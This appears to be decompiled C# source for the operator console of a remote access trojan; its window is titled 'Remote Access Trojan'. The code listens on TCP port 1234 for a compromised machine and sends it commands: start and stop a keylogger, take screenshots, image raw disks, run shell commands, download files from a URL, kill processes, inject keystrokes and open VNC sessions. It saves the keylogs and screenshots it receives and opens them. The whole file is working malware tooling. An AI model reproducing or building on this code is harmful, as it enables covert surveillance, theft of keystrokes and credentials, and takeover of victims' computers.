using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RAT_SERVER.Properties;

namespace RAT_SERVER
{
	public class RemoteCommand : Form
	{
		private delegate void Update_UI(string text);

		private IContainer components = null;

		private TextBox outputTextBox;

		private TextBox transmitTextBox;

		private PictureBox pictureBox5;

		private PictureBox pictureBox6;

		private Button startButton;

		private PictureBox pictureBox3;

		private Button sendButton;

		private PictureBox pictureBox1;

		private Label statusLabel;

		private Label tagStatusLabel;

		private System.Windows.Forms.Timer timer1;

		private static Socket RemoteSocket;

		private static Socket LocalSocket;

		private static IPEndPoint RemoteEndPoint;

		private static IPEndPoint LocalEndPoint;

		private static byte[] ReceiveBuffer;

		private static byte[] TransmitBuffer;

		private static string strTransmit;

		private static string strReceive;

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(RAT_SERVER.RemoteCommand));
			outputTextBox = new System.Windows.Forms.TextBox();
			transmitTextBox = new System.Windows.Forms.TextBox();
			pictureBox5 = new System.Windows.Forms.PictureBox();
			pictureBox6 = new System.Windows.Forms.PictureBox();
			startButton = new System.Windows.Forms.Button();
			pictureBox3 = new System.Windows.Forms.PictureBox();
			sendButton = new System.Windows.Forms.Button();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			statusLabel = new System.Windows.Forms.Label();
			tagStatusLabel = new System.Windows.Forms.Label();
			timer1 = new System.Windows.Forms.Timer(components);
			((System.ComponentModel.ISupportInitialize)pictureBox5).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox6).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox3).BeginInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			outputTextBox.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
			outputTextBox.Font = new System.Drawing.Font("Lucida Console", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			outputTextBox.ForeColor = System.Drawing.Color.Red;
			outputTextBox.Location = new System.Drawing.Point(12, 58);
			outputTextBox.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			outputTextBox.MaxLength = int.MaxValue;
			outputTextBox.Multiline = true;
			outputTextBox.Name = "outputTextBox";
			outputTextBox.ReadOnly = true;
			outputTextBox.ScrollBars = System.Windows.Forms.ScrollBars.Both;
			outputTextBox.Size = new System.Drawing.Size(588, 221);
			outputTextBox.TabIndex = 0;
			transmitTextBox.AcceptsTab = true;
			transmitTextBox.AutoCompleteCustomSource.AddRange(new string[17]
			{
				"/cdtray", "/diskimage", "/download", "exit", "/getprocesses", "/help", "/keyscan_start", "/keyscan_stop", "/kill", "/msgbox",
				"/querydisks", "/screenshot", "/shell", "/speak", "/sysinfo", "/type", "/vnc"
			});
			transmitTextBox.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.Append;
			transmitTextBox.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.CustomSource;
			transmitTextBox.BackColor = System.Drawing.SystemColors.ActiveCaptionText;
			transmitTextBox.Enabled = false;
			transmitTextBox.Font = new System.Drawing.Font("Lucida Console", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			transmitTextBox.ForeColor = System.Drawing.Color.Red;
			transmitTextBox.Location = new System.Drawing.Point(362, 287);
			transmitTextBox.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			transmitTextBox.Name = "transmitTextBox";
			transmitTextBox.Size = new System.Drawing.Size(218, 18);
			transmitTextBox.TabIndex = 2;
			pictureBox5.Image = (System.Drawing.Image)resources.GetObject("pictureBox5.Image");
			pictureBox5.Location = new System.Drawing.Point(0, 0);
			pictureBox5.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			pictureBox5.Name = "pictureBox5";
			pictureBox5.Size = new System.Drawing.Size(305, 39);
			pictureBox5.TabIndex = 43;
			pictureBox5.TabStop = false;
			pictureBox6.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
			pictureBox6.BackgroundImage = (System.Drawing.Image)resources.GetObject("pictureBox6.BackgroundImage");
			pictureBox6.Location = new System.Drawing.Point(272, 360);
			pictureBox6.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			pictureBox6.Name = "pictureBox6";
			pictureBox6.Size = new System.Drawing.Size(340, 30);
			pictureBox6.TabIndex = 44;
			pictureBox6.TabStop = false;
			startButton.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			startButton.BackgroundImage = (System.Drawing.Image)resources.GetObject("startButton.BackgroundImage");
			startButton.CausesValidation = false;
			startButton.Font = new System.Drawing.Font("Lucida Console", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			startButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
			startButton.Location = new System.Drawing.Point(60, 326);
			startButton.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			startButton.Name = "startButton";
			startButton.Size = new System.Drawing.Size(141, 22);
			startButton.TabIndex = 1;
			startButton.Text = "Start";
			startButton.UseVisualStyleBackColor = true;
			startButton.Click += new System.EventHandler(startButton_Click);
			pictureBox3.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			pictureBox3.Image = (System.Drawing.Image)resources.GetObject("pictureBox3.Image");
			pictureBox3.Location = new System.Drawing.Point(56, 322);
			pictureBox3.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			pictureBox3.Name = "pictureBox3";
			pictureBox3.Size = new System.Drawing.Size(149, 30);
			pictureBox3.TabIndex = 46;
			pictureBox3.TabStop = false;
			sendButton.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			sendButton.BackgroundImage = (System.Drawing.Image)resources.GetObject("sendButton.BackgroundImage");
			sendButton.CausesValidation = false;
			sendButton.Enabled = false;
			sendButton.Font = new System.Drawing.Font("Lucida Console", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			sendButton.ForeColor = System.Drawing.SystemColors.ButtonFace;
			sendButton.Location = new System.Drawing.Point(366, 326);
			sendButton.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			sendButton.Name = "sendButton";
			sendButton.Size = new System.Drawing.Size(141, 22);
			sendButton.TabIndex = 3;
			sendButton.Text = "Send";
			sendButton.UseVisualStyleBackColor = true;
			sendButton.Click += new System.EventHandler(sendButton_Click);
			pictureBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(362, 322);
			pictureBox1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(149, 30);
			pictureBox1.TabIndex = 48;
			pictureBox1.TabStop = false;
			statusLabel.AutoSize = true;
			statusLabel.Font = new System.Drawing.Font("Lucida Console", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			statusLabel.ForeColor = System.Drawing.Color.Red;
			statusLabel.Location = new System.Drawing.Point(473, 19);
			statusLabel.Name = "statusLabel";
			statusLabel.Size = new System.Drawing.Size(53, 11);
			statusLabel.TabIndex = 50;
			statusLabel.Text = "Closed";
			tagStatusLabel.AutoSize = true;
			tagStatusLabel.Font = new System.Drawing.Font("Lucida Console", 8.25f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			tagStatusLabel.ForeColor = System.Drawing.Color.White;
			tagStatusLabel.Location = new System.Drawing.Point(406, 19);
			tagStatusLabel.Name = "tagStatusLabel";
			tagStatusLabel.Size = new System.Drawing.Size(61, 11);
			tagStatusLabel.TabIndex = 49;
			tagStatusLabel.Text = "Status:";
			timer1.Interval = 350;
			timer1.Tick += new System.EventHandler(timer1_Tick);
			base.AcceptButton = sendButton;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.SystemColors.ActiveCaptionText;
			base.ClientSize = new System.Drawing.Size(612, 392);
			base.Controls.Add(statusLabel);
			base.Controls.Add(tagStatusLabel);
			base.Controls.Add(sendButton);
			base.Controls.Add(pictureBox1);
			base.Controls.Add(startButton);
			base.Controls.Add(pictureBox3);
			base.Controls.Add(pictureBox6);
			base.Controls.Add(pictureBox5);
			base.Controls.Add(transmitTextBox);
			base.Controls.Add(outputTextBox);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
			base.MinimizeBox = false;
			base.Name = "RemoteCommand";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Remote Access Trojan";
			((System.ComponentModel.ISupportInitialize)pictureBox5).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox6).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox3).EndInit();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}

		public RemoteCommand()
		{
			InitializeComponent();
		}

		private void startButton_Click(object sender, EventArgs e)
		{
			statusLabel.Text = "Listening";
			timer1.Enabled = true;
			try
			{
				LocalEndPoint = new IPEndPoint(IPAddress.Any, 1234);
				LocalSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				LocalSocket.Bind(LocalEndPoint);
				LocalSocket.Listen(1);
				LocalSocket.BeginAccept(Accept, LocalSocket);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Unable to Create Local Socket!" + Environment.NewLine + ex.InnerException.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			ShowCommandList();
			transmitTextBox.Focus();
			startButton.Enabled = false;
			transmitTextBox.Enabled = true;
			sendButton.Enabled = true;
			transmitTextBox.Focus();
		}

		private void sendButton_Click(object sender, EventArgs e)
		{
			strTransmit = transmitTextBox.Text;
			transmitTextBox.Clear();
			if (strTransmit == "/help")
			{
				ShowCommandList();
				return;
			}
			if (strTransmit == "/vnc start")
			{
				File.WriteAllBytes("vnclistener.exe", Resources.vnclistener);
				ThreadPool.QueueUserWorkItem(VNC, null);
			}
			else if (strTransmit == "exit")
			{
				startButton.Enabled = true;
				sendButton.Enabled = false;
				transmitTextBox.Enabled = false;
				Update_Label("Closed");
				timer1.Enabled = false;
				tagStatusLabel.ForeColor = Color.White;
				statusLabel.ForeColor = Color.Red;
				if (RemoteSocket == null)
				{
					LocalSocket.Close();
					return;
				}
			}
			TransmitBuffer = Encoding.ASCII.GetBytes(strTransmit);
			RemoteSocket.BeginSend(TransmitBuffer, 0, TransmitBuffer.Length, SocketFlags.None, Send, RemoteSocket);
		}

		private void Accept(IAsyncResult iar)
		{
			Update_Label("Connected");
			try
			{
				Socket socket = (Socket)iar.AsyncState;
				RemoteSocket = socket.EndAccept(iar);
				ReceiveBuffer = new byte[2048576];
				RemoteSocket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, SocketFlags.None, Receive, RemoteSocket);
			}
			catch
			{
				Update_Label("Closed");
			}
		}

		private void Receive(IAsyncResult iar)
		{
			try
			{
				Socket socket = (Socket)iar.AsyncState;
				int num = socket.EndReceive(iar);
				strReceive = Encoding.ASCII.GetString(ReceiveBuffer, 0, 4);
				byte[] array = new byte[num - 4];
				if (strReceive.Contains(".txt"))
				{
					Buffer.BlockCopy(ReceiveBuffer, 4, array, 0, num - 4);
					File.WriteAllBytes("logs.txt", array);
					Process.Start("logs.txt");
				}
				else if (strReceive.Contains(".png"))
				{
					Buffer.BlockCopy(ReceiveBuffer, 4, array, 0, num - 4);
					File.WriteAllBytes("screenshot.png", array);
					Process.Start("screenshot.png");
				}
				else
				{
					strReceive = Encoding.ASCII.GetString(ReceiveBuffer, 0, num);
					Update_Textbox(strReceive);
				}
				ReceiveBuffer = new byte[2048576];
				socket.BeginReceive(ReceiveBuffer, 0, ReceiveBuffer.Length, SocketFlags.None, Receive, socket);
			}
			catch
			{
			}
		}

		private void Send(IAsyncResult iar)
		{
			Socket socket = (Socket)iar.AsyncState;
			socket.EndSend(iar);
			if (strTransmit == "exit")
			{
				Update_Textbox("");
				RemoteSocket.Shutdown(SocketShutdown.Both);
				RemoteSocket.Close();
				LocalSocket.Close();
			}
			else if (strTransmit == "/vnc stop")
			{
				Thread.Sleep(5000);
				File.Delete("vnclistener.exe");
			}
		}

		private void VNC(object o)
		{
			Process process = Process.Start("vnclistener.exe", "-listen");
		}

		private void Update_Textbox(string text)
		{
			if (outputTextBox.InvokeRequired)
			{
				outputTextBox.Invoke(new Update_UI(Update_Textbox), text);
			}
			else
			{
				outputTextBox.Text = text;
			}
		}

		private void Update_Label(string text)
		{
			if (statusLabel.InvokeRequired)
			{
				statusLabel.Invoke(new Update_UI(Update_Label), text);
			}
			else
			{
				statusLabel.Text = text;
			}
		}

		private void ShowCommandList()
		{
			string empty = string.Empty;
			empty = empty + "Command List  Options           Description" + Environment.NewLine;
			empty = empty + "============  =======           ===========" + Environment.NewLine;
			empty = empty + "/cdtray       <open/close>      (Opens or Closes the CDTray)" + Environment.NewLine;
			empty = empty + "/diskimage    <DiskID>          (Gets a raw binary image of a disk)" + Environment.NewLine;
			empty = empty + "/download     <URL>             (Downloads a File From the Net)" + Environment.NewLine;
			empty = empty + "exit             -              (Safely Disconnects from RAT)" + Environment.NewLine;
			empty = empty + "/getprocesses    -              (Gets a list of running Processes)" + Environment.NewLine;
			empty = empty + "/help            -              (Shows the available Command List)" + Environment.NewLine;
			empty = empty + "/keyscan_start   -              (Starts Remote Keylogger)" + Environment.NewLine;
			empty = empty + "/keyscan_stop    -              (Stops Remote Keylogger)" + Environment.NewLine;
			empty = empty + "/kill         <process name/pid>(Kills a running Process)" + Environment.NewLine;
			empty = empty + "/msgbox       <message>         (Executes a Message Box)" + Environment.NewLine;
			empty = empty + "/querydisks      -              (Gets details of logical disks)" + Environment.NewLine;
			empty = empty + "/screenshot      -              (Gets a Screenshot of current Screen)" + Environment.NewLine;
			empty = empty + "/shell        <CMD Commands>    (Executes a Shell Command Remotely)" + Environment.NewLine;
			empty = empty + "/speak        <Text to Speak>   (Executes Speech Synthesis)" + Environment.NewLine;
			empty = empty + "/sysinfo         -              (Gets System Information)" + Environment.NewLine;
			empty = empty + "/type         <Text to Type>    (Sends Keystrokes Remotely)" + Environment.NewLine;
			empty = empty + "/vnc          <start/stop>      (Attempts a VNC Connection)" + Environment.NewLine;
			Update_Textbox(empty);
		}

		private void timer1_Tick(object sender, EventArgs e)
		{
			if (tagStatusLabel.ForeColor == Color.White)
			{
				tagStatusLabel.ForeColor = Color.Red;
			}
			else
			{
				tagStatusLabel.ForeColor = Color.White;
			}
			if (statusLabel.ForeColor == Color.White)
			{
				statusLabel.ForeColor = Color.Red;
			}
			else
			{
				statusLabel.ForeColor = Color.White;
			}
		}
	}
}
